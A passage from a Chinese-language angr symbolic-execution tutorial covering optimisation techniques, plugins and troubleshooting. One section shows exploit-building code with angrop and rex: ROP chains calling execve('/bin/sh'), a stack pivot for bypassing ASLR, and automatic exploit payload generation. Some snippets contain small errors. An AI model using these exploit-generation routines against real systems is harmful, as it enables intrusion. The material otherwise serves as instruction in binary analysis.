def hybrid_fuzzing_symbolic_seed(binary_path, target_func_addr):
    """
    使用符号执行生成 Fuzzing 种子
    
    思路：
    1. 使用符号执行到达目标函数的深层路径
    2. 求解出对应的输入作为 Fuzzing 种子
    3. 交给 AFL 等 Fuzzer 进一步变异测试
    """
    import angr
    import claripy
    
    proj = angr.Project(binary_path, auto_load_libs=False)
    
    # 创建符号输入
    input_data = claripy.BVS("input", 8 * 256)
    state = proj.factory.entry_state(stdin=input_data)
    
    simgr = proj.factory.simulation_manager(state)
    
    # 探索到目标函数
    simgr.explore(find=target_func_addr)
    
    seeds = []
    if simgr.found:
        for i, s in enumerate(simgr.found[:10]):
            seed = s.posix.dumps(0)
            seed = seed.split(b'\x00')[0]
            seeds.append(seed)
            
            # 保存种子文件
            with open(f"seeds/seed_{i:03d}.bin", "wb") as f:
                f.write(seed)
            
            print(f"[+] 生成种子 #{i}: {len(seed)} 字节")
    
    print(f"\n共生成 {len(seeds)} 个种子文件，可用于 AFL Fuzzing")
    print("使用方法: afl-fuzz -i seeds/ -o output/ ./binary @@")
    
    return seeds
```

---

## 6. 高级技巧与优化

符号执行面临的最大挑战是路径爆炸和性能问题。本章介绍各种优化技巧，帮助你更高效地使用 angr。

### 6.1 符号执行加速技巧

#### 6.1.1 状态剪枝（State Pruning）

状态剪枝是指在探索过程中丢弃不可能到达目标或明显无意义的状态，从而减少需要处理的状态数量。

```python
from angr.exploration_techniques import ExplorationTechnique

class StatePruning(ExplorationTechnique):
    """自定义状态剪枝技术"""
    
    def __init__(self, max_constraints=1000, max_stack_depth=50):
        super().__init__()
        self.max_constraints = max_constraints
        self.max_stack_depth = max_stack_depth
        self.pruned = 0
    
    def step(self, simgr, stash='active', **kwargs):
        # 在每步之前剪枝
        simgr = simgr.step(stash=stash, **kwargs)
        
        # 剪枝条件1：约束过多的状态
        simgr.move(
            from_stash=stash,
            to_stash='pruned',
            filter_func=lambda s: len(s.solver.constraints) > self.max_constraints
        )
        
        # 剪枝条件2：栈深度过大
        def too_deep(state):
            # 估算栈深度（通过返回地址数量）
            # 简化实现
            return False  # 根据实际情况实现
        
        simgr.move(
            from_stash=stash,
            to_stash='pruned',
            filter_func=too_deep
        )
        
        self.pruned = len(simgr.stashes.get('pruned', []))
        return simgr

# 使用方法
simgr = proj.factory.simulation_manager(state)
pruning = StatePruning(max_constraints=500)
simgr.use_technique(pruning)
simgr.explore(find=target_addr)

print(f"剪枝了 {pruning.pruned} 个状态")
```

#### 6.1.2 路径合并（State Merging）

路径合并是将相似的状态合并为一个状态，从而减少状态数量。angr 提供了多种合并策略。

```python
from angr.exploration_techniques import Merger

simgr = proj.factory.simulation_manager(state)

# 使用 Merger 技术
merger = Merger(
    merge_conditions=[],  # 合并条件
    merge_when=True,      # 启用合并
)
simgr.use_technique(merger)

# 手动合并状态
def merge_similar_states(simgr, stash='active'):
    """手动合并且有相同地址的状态"""
    states_by_addr = {}
    
    for s in list(simgr.stashes[stash]):
        addr = s.addr
        if addr not in states_by_addr:
            states_by_addr[addr] = []
        states_by_addr[addr].append(s)
    
    for addr, states in states_by_addr.items():
        if len(states) > 1:
            # 尝试合并
            try:
                merged = states[0].merge(*states[1:])
                # 替换原状态
                simgr.stashes[stash] = [s for s in simgr.stashes[stash] if s not in states]
                simgr.stashes[stash].append(merged[0])
                print(f"合并了 {len(states)} 个状态在地址 {hex(addr)}")
            except Exception as e:
                print(f"合并失败 at {hex(addr)}: {e}")
    
    return simgr
```

#### 6.1.3 内存优化

符号执行中的内存操作是性能瓶颈之一。以下是一些优化技巧：

```python
# 1. 使用更高效的内存后端
state = proj.factory.entry_state(
    remove_options={
        angr.options.SIMPLIFY_MEMORY_WRITES,  # 减少不必要的简化
    }
)

# 2. 懒求解（Lazy Solving）
# 默认启用，可以延迟约束求解
state = proj.factory.entry_state(
    add_options={angr.options.LAZY_SOLVES}
)

# 3. 限制符号内存大小
# 避免创建过大的符号内存区域

# 4. 使用具体执行加速（Unicorn 引擎）
state = proj.factory.entry_state(
    add_options={angr.options.UNICORN}
)
```

### 6.2 处理循环与递归

循环是导致路径爆炸的主要原因之一。以下是处理循环的常用策略。

#### 6.2.1 限制循环迭代次数

```python
from angr.exploration_techniques import LoopSeer

def solve_with_loop_limit(proj, state, target_addr, loop_limit=10):
    """使用 LoopSeer 限制循环次数"""
    simgr = proj.factory.simulation_manager(state)
    
    loop_seer = LoopSeer(
        loop_project=proj,
        use_header=False,
        limit=loop_limit,  # 每个循环最多迭代次数
    )
    simgr.use_technique(loop_seer)
    
    simgr.explore(find=target_addr)
    
    return simgr
```

#### 6.2.2 使用 Veritesting

Veritesting 是一种将静态分析与动态符号执行结合的技术，可以自动处理简单循环。

```python
from angr.exploration_techniques import Veritesting

def solve_with_veritesting(proj, state, target_addr):
    """使用 Veritesting 处理循环"""
    simgr = proj.factory.simulation_manager(state)
    
    veritesting = Veritesting(
        enable_veritesting=True,
        veritesting_max_states=100,
        # 可以指定在哪些地址启用 veritesting
        # bounded_blocks=set()
    )
    simgr.use_technique(veritesting)
    
    simgr.explore(find=target_addr)
    
    return simgr
```

#### 6.2.3 循环展开手动处理

对于已知结构的循环，可以手动展开：

```python
def unroll_loop_manually(proj, loop_header_addr, loop_exit_addr, iterations=5):
    """
    手动展开循环
    
    思路：在循环头部 hook，计数迭代次数，
    达到上限后强制跳转到循环出口
    """
    iteration_count = [0]  # 使用列表实现闭包可变变量
    
    @proj.hook(loop_header_addr, length=0)
    def loop_counter(state):
        iteration_count[0] += 1
        if iteration_count[0] > iterations:
            # 强制跳出循环
            state.ip = loop_exit_addr
            iteration_count[0] = 0  # 重置计数器
    
    return iteration_count
```

### 6.3 处理复杂系统调用

当程序使用大量系统调用时，完整模拟所有系统调用会非常耗时。可以使用以下策略：

#### 6.3.1 模拟系统调用

```python
from angr import SimProcedure
import claripy

# 自定义 read 系统调用
class FastRead(SimProcedure):
    """快速 read 模拟，返回符号数据"""
    
    def run(self, fd, buf, count):
        # 读取 count 字节的符号数据
        data = claripy.BVS("read_data", 8 * self.state.solver.eval(count))
        self.state.memory.store(buf, data)
        
        # 返回读取的字节数
        return count

# 注册自定义系统调用
# 注意：系统调用号因架构而异
# proj._simos.syscall_table.set_handler(syscall_num, handler)

def hook_syscalls(proj):
    """Hook 常用系统调用以加速执行"""
    # 对于不需要精确模拟的系统调用，用快速存根替换
    syscalls_to_hook = {
        'brk': 0,
        'mmap': None,  # 复杂的可能需要完整模拟
        'munmap': 0,
        'mprotect': 0,
    }
    
    # 实际使用时需要根据具体情况配置
    pass
```

#### 6.3.2 跳过无关系统调用

```python
from angr.exploration_techniques import ExplorationTechnique

class SkipIrrelevantSyscalls(ExplorationTechnique):
    """跳过不影响目标路径的系统调用"""
    
    def __init__(self, relevant_syscalls=None):
        super().__init__()
        self.relevant_syscalls = relevant_syscalls or set()
    
    def step_state(self, simgr, state, **kwargs):
        # 检查是否是系统调用
        if state.history.jumpkind == 'Ijk_Sys_syscall':
            syscall_num = state.regs.eax  # x86 下系统调用号在 eax
            # 根据架构调整
            
            if syscall_num not in self.relevant_syscalls:
                # 跳过不相关的系统调用，直接返回成功
                state.regs.eax = 0  # 返回值
        
        return simgr.step_state(state, **kwargs)
```

### 6.4 Veritesting技术详解

Veritesting 是 angr 中一项重要的优化技术，它结合了静态分析和动态符号执行的优点。

#### 6.4.1 Veritesting 原理

Veritesting 的核心思想：
1. 当符号执行进入一个函数或代码区域时，先尝试用静态分析的方法计算所有路径的约束
2. 将多条路径合并为一个带有更复杂约束的状态
3. 从而大幅减少状态数量

```python
from angr.exploration_techniques import Veritesting

def veritesting_demo(proj, state):
    """Veritesting 使用示例"""
    simgr = proj.factory.simulation_manager(state)
    
    # 配置 Veritesting
    v = Veritesting(
        enable_veritesting=True,              # 启用 veritesting
        veritesting_max_states=100,           # veritesting 区域内最大状态数
        veritesting_max_loop_iterations=10,   # 循环最大迭代次数
        veritesting_bounded_blocks=None,      # 限制在指定基本块内
    )
    
    simgr.use_technique(v)
    
    # 执行
    simgr.run(n=1000)
    
    print(f"活跃状态: {len(simgr.active)}")
    print(f"死路状态: {len(simgr.deadended)}")
    
    return simgr
```

#### 6.4.2 Veritesting 适用场景

Veritesting 特别适合以下场景：
- 包含大量条件分支的函数
- 简单的循环（迭代次数有限）
- 连续的 if-else 语句链
- switch-case 结构

不适用的场景：
- 复杂的嵌套循环
- 大量间接跳转
- 递归函数
- 复杂的内存操作

### 6.5 自定义探索策略

angr 的 ExplorationTechnique 机制允许你完全自定义探索策略。

#### 6.5.1 覆盖率引导探索

类似 AFL 的覆盖率引导策略：

```python
from angr.exploration_techniques import ExplorationTechnique
import random

class CoverageGuidedExplorer(ExplorationTechnique):
    """
    覆盖率引导的探索策略
    优先探索能覆盖新地址的状态
    """
    
    def __init__(self):
        super().__init__()
        self.covered_addresses = set()
        self.new_path_count = 0
    
    def step(self, simgr, stash='active', **kwargs):
        # 执行一步
        simgr = simgr.step(stash=stash, **kwargs)
        
        # 收集新覆盖的地址
        new_states = []
        for state in simgr.stashes[stash]:
            addr = state.addr
            if addr not in self.covered_addresses:
                self.covered_addresses.add(addr)
                self.new_path_count += 1
                # 将新发现的状态移到前面，优先探索
                new_states.insert(0, state)
            else:
                new_states.append(state)
        
        simgr.stashes[stash] = new_states
        return simgr
    
    def get_coverage(self):
        return len(self.covered_addresses)

# 使用示例
simgr = proj.factory.simulation_manager(state)
explorer = CoverageGuidedExplorer()
simgr.use_technique(explorer)

for i in range(100):
    simgr.step()
    if i % 10 == 0:
        print(f"Step {i}: 覆盖 {explorer.get_coverage()} 个地址, 活跃状态 {len(simgr.active)}")
```

#### 6.5.2 目标导向探索（DFS with heuristic）

```python
class TargetGuidedExplorer(ExplorationTechnique):
    """
    目标导向的探索策略
    使用距离启发式函数，优先探索更接近目标的状态
    """
    
    def __init__(self, target_addr, cfg=None):
        super().__init__()
        self.target_addr = target_addr
        self.cfg = cfg  # 可选的 CFG 用于计算距离
    
    def distance_to_target(self, state):
        """计算当前状态到目标的距离（启发式）"""
        # 简单方法：地址差的绝对值
        return abs(state.addr - self.target_addr)
    
    def step(self, simgr, stash='active', **kwargs):
        # 按距离排序，优先探索距离近的
        simgr.stashes[stash].sort(key=lambda s: self.distance_to_target(s))
        
        # 只保留最有希望的 N 个状态
        max_states = 50
        if len(simgr.stashes[stash]) > max_states:
            # 将多余的状态移到 deferred stash
            simgr.split(
                from_stash=stash,
                to_stash='deferred',
                limit=max_states,
            )
        
        return simgr.step(stash=stash, **kwargs)
```

#### 6.5.3 多策略组合

实际使用中，通常需要组合多种探索技术：

```python
def optimized_exploration(proj, state, target_addr):
    """优化的探索策略组合"""
    simgr = proj.factory.simulation_manager(state)
    
    # 1. Veritesting 处理循环和分支
    from angr.exploration_techniques import Veritesting
    simgr.use_technique(Veritesting(
        enable_veritesting=True,
        veritesting_max_states=50,
    ))
    
    # 2. 循环限制
    from angr.exploration_techniques import LoopSeer
    simgr.use_technique(LoopSeer(
        loop_project=proj,
        limit=15,
    ))
    
    # 3. 路径长度限制
    from angr.exploration_techniques import LengthLimiter
    simgr.use_technique(LengthLimiter(
        max_length=10000,
    ))
    
    # 4. 状态去重
    from angr.exploration_techniques import Uniquifier
    simgr.use_technique(Uniquifier())
    
    # 开始探索
    simgr.explore(find=target_addr)
    
    return simgr
```

### 6.6 性能调优检查清单

在符号执行遇到性能问题时，可以按以下清单逐一排查：

```text
符号执行性能调优检查清单：

1. 状态数量爆炸
   [ ] 检查是否有循环导致指数级状态增长
   [ ] 启用 Veritesting
   [ ] 设置 LoopSeer 限制循环次数
   [ ] 使用状态合并技术

2. 约束求解慢
   [ ] 检查约束数量是否过多
   [ ] 启用 LAZY_SOLVES 懒求解
   [ ] 减少不必要的符号变量
   [ ] 简化约束表达式

3. 内存使用过高
   [ ] 限制活跃状态数量
   [ ] 使用 SIMPLIFY_MEMORY_WRITES
   [ ] 及时丢弃不需要的状态
   [ ] 检查是否有大的符号内存区域

4. 执行速度慢
   [ ] 启用 UNICORN 加速具体执行
   [ ] Hook 掉无关的外部函数
   [ ] 减少跟踪选项（TRACK_*）
   [ ] 检查是否有不必要的状态复制
```

---

## 7. angr插件与生态

angr 拥有丰富的插件生态系统，这些插件扩展了 angr 的功能，使其能够应对更复杂的分析场景。

### 7.1 angrutils使用

angrutils 是一个实用工具集合，提供了许多方便的辅助函数。

#### 7.1.1 安装

```bash
pip install angr-utils
```

#### 7.1.2 常用功能

```python
import angr
from angrutils import *

proj = angr.Project("./binary", auto_load_libs=False)

# 1. 生成 CFG（控制流图）
cfg = proj.analyses.CFGFast()
print(f"CFG 节点数: {len(cfg.graph.nodes())}")
print(f"CFG 边数: {len(cfg.graph.edges())}")

# 2. 可视化 CFG（需要 graphviz）
# plot_cfg(cfg, "cfg_output", asminst=True, remove_imports=True)

# 3. 查找函数
cfg = proj.analyses.CFGFast()
for func_addr, func in cfg.kb.functions.items():
    if func.name == "target_function":
        print(f"找到函数 {func.name} at {hex(func_addr)}")

# 4. 打印函数的基本块
def print_function_blocks(proj, func_addr):
    """打印函数的所有基本块"""
    cfg = proj.analyses.CFGFast()
    func = cfg.kb.functions[func_addr]
    
    print(f"函数 {func.name} ({hex(func_addr)}):")
    for block in func.blocks:
        print(f"  块 {hex(block.addr)}:")
        # 反汇编
        for insn in block.capstone.insns:
            print(f"    {hex(insn.address)}: {insn.mnemonic} {insn.op_str}")

# 5. 获取函数调用图
def get_call_graph(proj):
    """获取函数调用图"""
    cfg = proj.analyses.CFGFast()
    cg = cfg.functions.callgraph
    
    print("函数调用关系:")
    for caller, callee in cg.edges():
        caller_func = cfg.kb.functions[caller]
        callee_func = cfg.kb.functions[callee]
        print(f"  {caller_func.name} -> {callee_func.name}")
    
    return cg
```

#### 7.1.3 状态可视化

```python
def visualize_state(state):
    """可视化当前状态"""
    # 打印寄存器状态
    print("=== 寄存器状态 ===")
    for reg_name in ['eax', 'ebx', 'ecx', 'edx', 'esi', 'edi', 'ebp', 'esp', 'eip']:
        val = state.regs.__getattr__(reg_name)
        if val.symbolic:
            print(f"  {reg_name}: {val} (符号)")
        else:
            print(f"  {reg_name}: {hex(state.solver.eval(val))}")
    
    # 打印栈帧
    print("\n=== 栈帧 ===")
    esp_val = state.solver.eval(state.regs.esp)
    for offset in range(-32, 32, 4):
        addr = esp_val + offset
        try:
            val = state.memory.load(addr, 4)
            if val.symbolic:
                print(f"  {hex(addr)}: {val} (符号)")
            else:
                print(f"  {hex(addr)}: {hex(state.solver.eval(val))}")
        except:
            print(f"  {hex(addr)}: <不可读>")
```

### 7.2 angrop（ROP链自动生成）

angrop 是 angr 的 ROP 链自动生成插件，可以自动搜索 gadget 并构造 ROP 链。

#### 7.2.1 安装

```bash
pip install angrop
```

#### 7.2.2 基本使用

```python
import angr
import angrop

def generate_rop_chain(binary_path):
    """使用 angrop 自动生成 ROP 链"""
    # 加载二进制
    proj = angr.Project(binary_path, auto_load_libs=False)
    
    # 创建 ROP 对象
    rop = rop = angrop.ROP(proj)
    
    # 分析 gadget（可能需要一些时间）
    print("[*] 分析 gadgets...")
    rop.find_gadgets()
    
    print(f"[+] 找到 {len(rop.gadgets)} 个 gadgets")
    
    # 示例1：生成设置寄存器的 ROP 链
    print("\n[*] 生成设置寄存器的 ROP 链...")
    chain = rop.set_regs(eax=0xb, ebx=0xdeadbeef, ecx=0)
    if chain:
        print(f"[+] 成功生成 ROP 链，长度: {len(chain.payload_str())} 字节")
        print(f"    链内容: {chain.payload_str().hex()}")
        
        # 打印链中的 gadget
        for gadget in chain._gadgets:
            print(f"    {hex(gadget.addr)}: {gadget}")
    
    return rop
```

#### 7.2.3 生成 execve ROP 链

```python
def generate_execve_rop(binary_path):
    """生成调用 execve 的 ROP 链"""
    proj = angr.Project(binary_path, auto_load_libs=False)
    rop = angrop.ROP(proj)
    rop.find_gadgets()
    
    # 尝试生成 execve("/bin/sh", 0, 0) ROP 链
    print("[*] 生成 execve ROP 链...")
    
    try:
        # 方法1：使用 do_syscall
        chain = rop.do_syscall(11, [b"/bin/sh\x00", 0, 0])  # execve = 11 (x86)
        if chain:
            print("[+] execve ROP 链生成成功！")
            print(f"    payload: {chain.payload_str().hex()}")
            return chain
    except Exception as e:
        print(f"    方法1失败: {e}")
    
    # 方法2：手动构造
    try:
        # 先找可以写入内存的 gadget
        # 将 "/bin/sh" 写入可写内存
        writable_addr = None
        for seg in proj.loader.main_object.segments:
            if seg.is_writable:
                writable_addr = seg.vaddr
                break
        
        if writable_addr:
            # 构造链：写字符串到内存 + 设置寄存器 + 调用 int 0x80
            chain = rop.write_to_mem(writable_addr, b"/bin/sh\x00")
            chain += rop.set_regs(eax=0xb, ebx=writable_addr, ecx=0, edx=0)
            
            # 找 int 0x80 gadget
            int80_gadget = rop.find_gadget("int 0x80")
            if int80_gadget:
                chain.add_gadget(int80_gadget)
                print("[+] 手动构造 execve ROP 链成功！")
                return chain
    except Exception as e:
        print(f"    方法2失败: {e}")
    
    return None
```

#### 7.2.4 绕过 ASLR 的 ROP 链

```python
def generate_rop_with_pivot(rop, stack_pivot_addr, target_func):
    """
    生成包含栈 pivot 的 ROP 链
    用于绕过 ASLR 或栈空间不足的情况
    """
    # 找 leave; ret 或 pop rbp; ret 等栈 pivot gadget
    pivot_gadgets = rop.rop_gadgets_dict.get('pivot', [])
    
    if not pivot_gadgets:
        print("未找到栈 pivot gadget")
        return None
    
    # 选择一个 pivot gadget
    pivot = pivot_gadgets[0]
    
    # 构造第一阶段：pivot 到新的栈
    # 新栈中放置完整的 ROP 链
    stage2 = rop.set_regs(eax=0xb, ebx=0xdeadbeef)
    
    # 第一阶段只需要 pivot
    stage1 = pivot
    
    print(f"Pivot gadget: {hex(pivot.addr)}")
    print(f"Stage 2 长度: {len(stage2.payload_str())}")
    
    return stage1, stage2
```

### 7.3 rex（漏洞利用自动生成）

rex 是一个自动化漏洞利用生成框架，基于 angr 和 angrop 构建，可以自动生成漏洞利用代码。

#### 7.3.1 安装

```bash
pip install rex
```

#### 7.3.2 基本使用

```python
import rex
import angr

def auto_exploit(binary_path, crash_input):
    """
    使用 rex 自动生成漏洞利用
    
    Args:
        binary_path: 二进制文件路径
        crash_input: 导致崩溃的输入
    """
    # 1. 创建崩溃对象
    crash = rex.Crash(binary_path, crash_input)
    
    # 2. 分析崩溃类型
    print(f"崩溃类型: {crash.crash_type}")
    print(f"崩溃地址: {hex(crash.crash_addr)}")
    print(f"可控寄存器: {crash.registers_controlled}")
    
    # 3. 尝试生成 exploit
    print("\n[*] 尝试生成 exploit...")
    
    # 尝试多种 exploit 类型
    exploit_types = [
        'rop_set_register',
        'rop_leak_memory',
        'rop_shellcode',
        'call_shellcode',
    ]
    
    for exploit_type in exploit_types:
        try:
            exploit = crash.exploit()
            if exploit:
                print(f"[+] 成功生成 {exploit_type} exploit!")
                print(f"    Payload 长度: {len(exploit.payload)}")
                print(f"    Payload: {exploit.payload.hex()}")
                
                # 保存 exploit
                with open("exploit.bin", "wb") as f:
                    f.write(exploit.payload)
                
                return exploit
        except Exception as e:
            print(f"    {exploit_type} 失败: {e}")
            continue
    
    print("[-] 无法自动生成 exploit")
    return None
```

### 7.4 其他有用的插件

#### 7.4.1 angr-management（GUI工具）

angr-management 是 angr 的官方 GUI 工具，提供了图形化的二进制分析界面。

```bash
# 安装
pip install angr-management

# 启动
python -m angrmanagement
```

功能特点：
- 交互式反汇编视图
- 控制流图可视化
- 符号执行状态可视化
- 断点和单步执行
- 内存和寄存器查看

#### 7.4.2 Driller（混合模糊测试）

Driller 是一个结合了符号执行和模糊测试的工具，使用 angr 来帮助 AFL 探索难以到达的代码路径。

```python
# Driller 工作原理
# 1. AFL 先进行模糊测试
# 2. 当 AFL 卡住时（长时间没有新路径），Driller 启动
# 3. Driller 使用符号执行找到新路径
# 4. 将新路径的输入作为种子返回给 AFL
# 5. 循环往复

# 使用示例（概念性）
"""
import driller

driller_env = driller.DrillerEnv(
    binary="./target",
    work_dir="./work",
    fuzzer="afl",
)

driller_env.run()
"""
```

#### 7.4.3 Patcherex（二进制补丁）

Patcherex 是一个基于 angr 的二进制补丁框架，可以自动在二进制文件中插入补丁代码。

```python
# Patcherex 用于自动修补漏洞
"""
from patcherex.patches import *
from patcherex.backends.detourbackend import DetourBackend

# 加载二进制
backend = DetourBackend("./vulnerable")

# 添加补丁：修复缓冲区溢出
patch = AddEntryPointPatch(
    code_file="patch.S",      # 补丁汇编代码
    name="overflow_fix",
)

backend.apply_patches([patch])
backend.save("./patched")
"""
```

#### 7.4.4 其他有用的工具

| 工具名称 | 用途 | 安装 |
|---------|------|------|
| **angr-doc** | angr 官方文档 | `git clone` |
| **claripy** | 约束求解后端（内置） | 随 angr 安装 |
| **cle** | 二进制加载器（内置） | 随 angr 安装 |
| **pyvex** | VEX IR 绑定（内置） | 随 angr 安装 |
| **archinfo** | 架构信息库（内置） | 随 angr 安装 |
| **pwnscripts** | CTF pwn 题辅助脚本 | `pip install pwnscripts` |
| **one_gadget** | 查找 one gadget | `gem install one_gadget` |
| **ROPgadget** | Gadget 搜索工具 | `pip install ROPgadget` |

---

## 8. 常见问题与解决方案

在使用 angr 的过程中，你可能会遇到各种问题。本章总结了最常见的问题及其解决方案。

### 8.1 路径爆炸问题与缓解

#### 8.1.1 问题描述

路径爆炸（Path Explosion）是符号执行最根本的挑战。当程序中有大量分支时，路径数量呈指数增长，导致符号执行无法在合理时间内完成。

**典型表现：**
- 活跃状态数快速增长（每一步翻倍）
- 内存使用量持续增加
- 执行速度越来越慢
- 程序似乎"卡住"了

#### 8.1.2 解决方案

**方案1：限制状态数量**

```python
from angr.exploration_techniques import ExplorationTechnique

class StateLimiter(ExplorationTechnique):
    """限制活跃状态数量"""
    
    def __init__(self, max_states=100):
        super().__init__()
        self.max_states = max_states
    
    def step(self, simgr, stash='active', **kwargs):
        simgr = simgr.step(stash=stash, **kwargs)
        
        if len(simgr.stashes[stash]) > self.max_states:
            # 随机丢弃多余的状态
            import random
            states = list(simgr.stashes[stash])
            random.shuffle(states)
            simgr.stashes[stash] = states[:self.max_states]
            
            # 将丢弃的状态移到 spare stash
            # simgr.stashes['spared'] = states[self.max_states:]
        
        return simgr
```

**方案2：优先探索最有希望的路径**

```python
def heuristic_exploration(proj, state, target_addr):
    """使用启发式策略优先探索接近目标的路径"""
    simgr = proj.factory.simulation_manager(state)
    
    class HeuristicExplorer(ExplorationTechnique):
        def __init__(self, target):
            super().__init__()
            self.target = target
        
        def step(self, simgr, stash='active', **kwargs):
            # 按到目标的距离排序
            simgr.stashes[stash].sort(
                key=lambda s: abs(s.addr - self.target)
            )
            
            # 只保留前 N 个最有希望的状态
            max_states = 20
            if len(simgr.stashes[stash]) > max_states:
                simgr.split(
                    from_stash=stash,
                    to_stash='deferred',
                    limit=max_states,
                )
            
            return simgr.step(stash=stash, **kwargs)
    
    simgr.use_technique(HeuristicExplorer(target_addr))
    simgr.run(n=5000)
    
    return simgr
```

**方案3：使用 Veritesting 合并路径**

```python
# Veritesting 是缓解路径爆炸最有效的手段之一
# 特别适合有大量 if-else 或 switch-case 的代码
from angr.exploration_techniques import Veritesting

simgr.use_technique(Veritesting(
    enable_veritesting=True,
    veritesting_max_states=200,
))
```

**方案4：分阶段执行**

```python
def phased_execution(proj, milestones):
    """
    分阶段执行：每次只执行到一个里程碑，
    然后从里程碑状态继续，减少状态累积
    
    milestones: 里程碑地址列表 [addr1, addr2, addr3, ...]
    """
    state = proj.factory.entry_state()
    
    for i, milestone in enumerate(milestones):
        print(f"阶段 {i+1}: 到达 {hex(milestone)}")
        simgr = proj.factory.simulation_manager(state)
        simgr.explore(find=milestone)
        
        if not simgr.found:
            print(f"  失败：无法到达里程碑 {hex(milestone)}")
            return None
        
        # 只保留第一个找到的状态继续
        state = simgr.found[0]
        print(f"  成功！约束数: {len(state.solver.constraints)}")
    
    return state
```

### 8.2 内存模型限制

#### 8.2.1 问题描述

angr 的符号内存模型在处理某些情况时有限制：

- 大的符号内存区域会导致性能急剧下降
- 符号索引的内存访问可能不准确
- 内存别名问题（两个指针指向同一位置）
- 内存对齐问题

#### 8.2.2 解决方案

**方案1：避免创建过大的符号内存**

```python
# 不好的做法：创建太大的符号输入
bad_input = claripy.BVS("input", 8 * 4096)  # 4KB 符号内存

# 好的做法：只让实际需要的部分符号化
# 例如，如果已知密码长度是 16 字节
good_input = claripy.BVS("password", 8 * 16)
```

**方案2：使用具体内存+符号部分**

```python
# 先填入具体值，只让关键部分符号化
state.memory.store(buffer_addr, b'\x00' * 256)  # 先填充具体值
symbolic_part = claripy.BVS("data", 8 * 32)
state.memory.store(buffer_addr + 100, symbolic_part)  # 部分符号化
```

**方案3：处理符号索引内存访问**

```python
# 当数组索引是符号时，angr 可能产生大量状态
# 解决方案：限制索引范围

def constrain_array_index(state, index_var, array_size):
    """约束数组索引在有效范围内"""
    state.add_constraints(index_var >= 0)
    state.add_constraints(index_var < array_size)
```

### 8.3 环境模拟不完整的处理

#### 8.3.1 问题描述

angr 模拟的执行环境与真实环境存在差异：

- 某些系统调用没有完全模拟
- 库函数的 SimProcedure 可能不完整
- 文件系统、网络等 I/O 操作支持有限
- 多线程、信号等机制支持有限

#### 8.3.2 解决方案

**方案1：Hook 缺失的函数**

```python
# 找出所有未解析的符号并 hook
def hook_all_undefined(proj):
    """Hook 所有未定义的符号"""
    import cle
    
    for obj in proj.loader.all_objects:
        if isinstance(obj, cle.ELF):
            for reloc in obj.imports.values():
                if reloc.symbol and not reloc.resolved:
                    sym_name = reloc.symbol.name
                    addr = reloc.rebased_addr
                    
                    print(f"Hooking undefined symbol: {sym_name} @ {hex(addr)}")
                    
                    # 使用返回 0 的存根
                    stub = angr.SIM_PROCEDURES['stubs']['ReturnUnconstrained']()
                    proj.hook(addr, stub)
```

**方案2：自定义 SimProcedure**

```python
from angr import SimProcedure
import claripy

class CustomMalloc(SimProcedure):
    """自定义 malloc 实现"""
    
    def run(self, size):
        # 获取请求的大小
        size_val = self.state.solver.eval(size)
        
        # 分配内存（简单实现）
        # 实际 angr 有更复杂的堆管理
        heap_ptr = self.state.globals.get('heap_ptr', 0xc0000000)
        
        # 对齐
        aligned_size = (size_val + 15) & ~15
        ptr = heap_ptr
        self.state.globals['heap_ptr'] = heap_ptr + aligned_size + 0x10
        
        # 返回分配的指针
        return claripy.BVV(ptr, self.state.arch.bits)

# 注册
proj.hook_symbol("malloc", CustomMalloc())
```

**方案3：加载真实的共享库**

```python
# 加载真实的 libc（而不是使用 SimProcedure）
# 注意：这会显著增加执行时间

proj = angr.Project(
    "./binary",
    auto_load_libs=True,  # 自动加载依赖库
    # 或者手动指定
    force_load_libs=["/lib/x86_64-linux-gnu/libc.so.6"],
)
```

### 8.4 性能调优建议

#### 8.4.1 快速性能诊断

```python
def diagnose_performance(simgr):
    """诊断符号执行的性能瓶颈"""
    print("=== 性能诊断 ===")
    print(f"活跃状态数: {len(simgr.active)}")
    print(f"死路状态数: {len(simgr.deadended)}")
    print(f"避免状态数: {len(simgr.avoid)}")
    
    if simgr.active:
        state = simgr.active[0]
        print(f"\n第一个活跃状态:")
        print(f"  当前地址: {hex(state.addr)}")
        print(f"  约束数量: {len(state.solver.constraints)}")
        print(f"  历史地址数: {len(state.history.addrs)}")
        
        # 检查约束复杂度
        constraints = state.solver.constraints
        ast_sizes = [len(str(c)) for c in constraints]
        if ast_sizes:
            print(f"  平均约束大小: {sum(ast_sizes)/len(ast_sizes):.0f} 字符")
            print(f"  最大约束大小: {max(ast_sizes)} 字符")
```

#### 8.4.2 加速技巧汇总

| 优化手段 | 适用场景 | 预期效果 |
|---------|---------|---------|
| `auto_load_libs=False` | 不需要完整库函数 | 启动快，减少状态数 |
| `UNICORN` 选项 | 大量具体执行的代码 | 执行速度提升 10-100x |
| Veritesting | 多分支、简单循环 | 状态数减少 50-90% |
| LoopSeer | 循环多的程序 | 防止循环导致的路径爆炸 |
| 限制状态数 | 路径爆炸严重 | 内存使用可控 |
| 从函数中间开始 | 只关心特定函数 | 跳过初始化代码，节省时间 |
| Hook 外部函数 | 大量库函数调用 | 避免模拟复杂的库函数 |
| 简化约束 | 约束过于复杂 | 求解速度提升 |

#### 8.4.3 常见错误与解决

**错误1：`SimProcedureError` 或未定义符号**

```
错误：No SimProcedure found for symbol 'xxx'
```

解决：
```python
# 方法1：Hook 为返回 0 的存根
proj.hook_symbol("xxx", angr.SIM_PROCEDURES['stubs']['ReturnUnconstrained']())

# 方法2：加载真实的库
proj = angr.Project("./binary", auto_load_libs=True)

# 方法3：自己实现 SimProcedure
```

**错误2：`UnsatError` - 约束不可满足**

```
错误：Can't eval variable: 约束不可满足
```

可能原因：
- 添加了矛盾的约束
- 路径条件本身不可满足
- 变量被错误地约束

解决：
```python
# 检查约束是否可满足
if state.solver.satisfiable():
    val = state.solver.eval(var)
else:
    print("约束不可满足！")
    # 打印所有约束来调试
    for c in state.solver.constraints:
        print(f"  约束: {c}")
```

**错误3：内存访问错误**

```
错误：SimMemoryError: 地址不在内存中
```

解决：
```python
# 方法1：关闭严格内存检查
state = proj.factory.entry_state(
    remove_options={angr.options.STRICT_PAGE_ACCESS}
)

# 方法2：手动映射内存页
state.memory.map_region(addr, size, perm)

# 方法3：检查地址是否正确
print(f"尝试访问的地址: {hex(addr)}")
```

**错误4：执行太慢或卡住**

可能原因：
- 路径爆炸
- 约束求解过于复杂
- 循环没有限制

解决：
```python
# 1. 添加路径长度限制
from angr.exploration_techniques import LengthLimiter
simgr.use_technique(LengthLimiter(max_length=1000))

# 2. 添加循环限制
from angr.exploration_techniques import LoopSeer
simgr.use_technique(LoopSeer(loop_project=proj, limit=10))

# 3. 设置超时
import signal
import time

